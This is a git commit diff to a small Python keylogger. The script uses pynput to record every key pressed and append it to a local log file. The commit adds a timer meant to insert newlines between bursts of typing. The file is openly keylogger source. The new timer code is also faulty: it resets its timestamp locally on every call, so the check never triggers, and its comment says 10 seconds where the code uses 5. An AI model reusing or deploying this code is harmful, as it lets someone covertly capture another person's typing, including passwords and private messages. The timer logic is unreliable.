54c013b35666560ed2aa5c2873cc4387c99f36d1
eduardosm7 <esm7@cin.ufpe.br>
2018-10-25 18:12:27 -0300

    Add newline timer feature

--- keylogger.py
+++ keylogger.py
@@ -3,19 +3,37 @@ Simple keylogger
 """
 
 from pynput.keyboard import Key, Listener
+import time
+
+
+time_zero = time.time()
+
 
 def on_press(key):
     """
     Saves keyboard input into the log file
     """
+
+    time_zero = time.time()
+
     try:
         with open("log", "a+") as f:
             if key == Key.enter:
                 f.write("\n")
             else:
+                # If time difference between last alphanumerical input
+                # is greater than 10s, inserts as newline
+                if time.time() - time_zero > 5:
+                    f.write("\n")
                 f.write(key.char)
+                time_zero = time.time()  # Resets timer
     except AttributeError:
         pass
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
+
+def main():
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
